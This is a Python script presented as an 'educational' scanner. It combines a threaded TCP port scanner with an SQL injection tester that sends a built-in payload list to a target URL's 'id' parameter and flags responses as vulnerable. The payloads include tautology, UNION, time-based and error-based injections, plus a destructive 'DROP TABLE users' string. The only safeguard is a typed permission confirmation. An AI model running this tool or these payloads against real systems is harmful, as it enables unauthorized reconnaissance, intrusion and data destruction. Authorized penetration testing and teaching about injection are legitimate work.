#!/usr/bin/env python3
"""
Interactive Educational Scanner
- Interactive menu (SQLi / Port scan / Full port range / Both)
- Expanded SQL payload list
- Threaded TCP port scanner (fast)
WARNING: Use ONLY on systems you own or have explicit permission to test.
"""

import socket
import sys
import json
import time
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# ----------------- Configuration -----------------
DEFAULT_COMMON_PORTS = [
    20,21,22,23,25,53,67,68,69,80,110,119,123,135,137,138,139,143,161,162,
    179,389,443,445,465,514,587,636,993,995,1433,1521,1723,2049,3306,3389,
    5900,6379,8000,8080,8443
]

SQL_PAYLOADS = [
    # boolean / tautology
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1\" -- ",
    "' OR 1=1 -- ",
    "\" OR 1=1 -- ",
    # union
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    # stacked
    "'; DROP TABLE users; --",
    # time-based
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(5)--",
    # error-based
    "' or extractvalue(1,concat(0x7e,(select database())))--",
    # blind variants
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,database(),0x7e))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
    # MySQL specific
    "\" or sleep(3) #",
    "' or benchmark(10000000,MD5(1))-- ",
    # common payloads
    "admin' --",
    "1' OR '1'='1",
    "\" OR \"\" = \"",
    "') or ('1'='1' --",
    # Add more simple/common ones
    "' OR '1'='1' /*"
]

# ----------------- Helpers -----------------

def require_permission():
    print("\n!!! IMPORTANT !!!")
    print("Ensure you have explicit permission to test the target. Unauthorized scanning is illegal and can get you blocked or prosecuted.")
    ans = input("Do you confirm you have permission? (yes/NO) > ").strip().lower()
    return ans in ("yes", "y")

def normalize_url(target):
    parsed = urlparse(target)
    if not parsed.scheme:
        return "http://" + target
    return target

def safe_get(session, url, timeout=5, verify=False):
    try:
        return session.get(url, timeout=timeout, allow_redirects=True, verify=verify)
    except Exception as e:
        return e

# ----------------- SQLi Check -----------------

def run_sql_injection_tests(target_url, timeout=5, verify_ssl=False):
    session = requests.Session()
    session.headers.update({"User-Agent": "EduScanner-Interactive/1.0"})
    target = normalize_url(target_url)
    parsed = urlparse(target)
    base = urlunparse(parsed._replace(query=""))
    original_params = parse_qs(parsed.query)

    baseline_resp = safe_get(session, target, timeout=timeout, verify=verify_ssl)
    baseline_len = len(baseline_resp.text) if isinstance(baseline_resp, requests.Response) else 0

    results = []
    error_indicators = [
        "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation mark", "sql error",
        "warning: mysql", "odbc", "syntax to use near", "native client"
    ]

    print(f"\n[*] Running SQL injection payloads against: {target}\n")
    for p in SQL_PAYLOADS:
        # inject into param id or create id
        params = {k: v for k, v in original_params.items()}
        params["id"] = p
        test_url = base + "?" + urlencode(params, doseq=True)
        resp = safe_get(session, test_url, timeout=timeout, verify=verify_ssl)
        if isinstance(resp, Exception):
            results.append({"payload": p, "status": "ERROR", "detail": str(resp), "url": test_url})
            continue
        text = resp.text.lower()
        found = next((ind for ind in error_indicators if ind in text), None)
        length_diff = abs(len(text) - baseline_len) if baseline_len else None
        vuln = False
        reason = None
        if found:
            vuln = True
            reason = f"Error indicator: {found}"
        elif length_diff and baseline_len and length_diff > baseline_len * 0.5:
            vuln = True
            reason = f"Large response length difference (baseline {baseline_len} vs {len(text)})"

        status = "VULNERABLE" if vuln else "NOT VULNERABLE"
        results.append({
            "payload": p,
            "status": status,
            "reason": reason,
            "response_length": len(text),
            "url_tested": test_url
        })
        print(f"  payload: {p[:80]:80} -> {status}{(' - ' + reason) if reason else ''}")
        if vuln:
            # optional: stop on first positive detection (keeps output concise)
            # comment out the next line if you want it to test all payloads regardless
            break

    return results

# ----------------- Port Scan -----------------

def scan_port_one(ip, port, timeout=0.8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        res = s.connect_ex((ip, port))
        s.close()
        return (port, res == 0)
    except Exception:
        try:
            s.close()
        except:
            pass
        return (port, False)

def run_port_scan(hostname, ports, concurrency=200, timeout=0.8):
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror as e:
        return {"error": f"Could not resolve hostname {hostname}: {e}"}

    print(f"\n[*] Scanning host {hostname} ({ip}) on {len(ports)} port(s) with concurrency={concurrency} ...")
    open_ports = []
    start = time.time()
    with ThreadPoolExecutor(max_workers=min(concurrency, len(ports))) as ex:
        futures = {ex.submit(scan_port_one, ip, p, timeout): p for p in ports}
        for fut in as_completed(futures):
            port, is_open = fut.result()
            if is_open:
                open_ports.append(port)
                print(f"  [+] Port {port} OPEN")
    duration = time.time() - start
    print(f"Scan completed in {duration:.2f}s — open ports: {sorted(open_ports)}")
    return {"host": hostname, "ip": ip, "open_ports": sorted(open_ports), "duration_s": round(duration,2)}

# ----------------- Interactive Menu & Runner -----------------

def choose_menu():
    print("Select test to run:")
    print("  1) SQL Injection test only")
    print("  2) Port Scan (common ports)")
    print("  3) Port Scan (FULL 1-65535)  <-- VERY HEAVY, network & time intensive")
    print("  4) BOTH (SQLi + Port Scan (common))")
    choice = input("Enter choice (1/2/3/4) > ").strip()
    return choice

def read_target():
    t = input("Enter target (hostname or URL, e.g. example.com or http://example.com) > ").strip()
    return t

def main_interactive():
    print("Interactive Educational Scanner")
    if not require_permission():
        print("Permission not confirmed. Exiting.")
        sys.exit(1)

    choice = choose_menu()
    target = read_target()

    # Normalize host
    parsed = urlparse(target)
    if parsed.scheme:
        hostname = parsed.hostname
        target_url = target
    else:
        hostname = target.split("/")[0]
        target_url = normalize_url(target)

    results = {}
    output_json = False

    if choice == "1":
        sqli = run_sql_injection_tests(target_url)
        results["sql_injection"] = sqli

    elif choice == "2":
        ports = DEFAULT_COMMON_PORTS
        scan = run_port_scan(hostname, ports)
        results["port_scan_common"] = scan

    elif choice == "3":
        confirm = input("FULL scan will touch 65535 ports and can take minutes/hours and generate lots of traffic.\nType 'I UNDERSTAND' to proceed > ").strip()
        if confirm != "I UNDERSTAND":
            print("Confirmation not given. Aborting full scan.")
            sys.exit(1)
        ports = list(range(1, 65536))
        scan = run_port_scan(hostname, ports, concurrency=1000, timeout=0.6)
        results["port_scan_full"] = scan

    elif choice == "4":
        sqli = run_sql_injection_tests(target_url)
        ports = DEFAULT_COMMON_PORTS
        scan = run_port_scan(hostname, ports)
        results["sql_injection"] = sqli
        results["port_scan_common"] = scan

    else:
        print("Invalid choice. Exiting.")
        sys.exit(1)

    # Output choice
    how = input("Output format? (1) Text (2) JSON > ").strip()
    if how == "2":
        print(json.dumps(results, indent=2))
    else:
        print("\n--- SUMMARY ---")
        for k, v in results.items():
            print(f"\n[{k}]")
            if isinstance(v, list):
                for item in v:
                    print(" ", json.dumps(item, indent=2))
            else:
                print(" ", json.dumps(v, indent=2))

if __name__ == "__main__":
    try:
        main_interactive()
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        sys.exit(0)
